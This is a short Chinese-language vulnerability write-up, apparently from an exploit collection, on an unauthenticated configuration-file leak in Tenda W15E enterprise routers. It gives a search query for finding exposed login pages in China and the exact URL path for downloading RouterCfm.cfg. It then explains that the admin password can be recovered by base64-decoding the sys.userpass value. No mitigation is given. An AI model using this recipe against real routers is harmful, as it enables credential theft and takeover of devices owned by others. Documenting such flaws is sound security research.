# Tenda W15E企业级路由器 RouterCfm.cfg 配置文件泄漏漏洞

## 漏洞描述

Tenda 企业级路由器 RouterCfm.cfg 配置文件可在未授权的情况下被读取，导致账号密码等敏感信息泄漏

## 漏洞影响

<a-checkbox checked>Tenda 企业级路由器</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title=="Tenda | Login" && country="CN"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1642645426007-dae7304a-c0b0-4e24-b622-c4c4cae93f13.png)

访问路径

```go
/cgi-bin/DownloadCfg/RouterCfm.cfg
```

![img](../../../.vuepress/public/img/1642645500607-fbcda323-b8f8-406d-a77a-2cea223b9f77.png)

后台账号密码位于参数 `sys.userpass` base64解密后的字符

![img](../../../.vuepress/public/img/1642645610038-094fc290-4ccc-4579-8eef-cf7bee34344e.png)



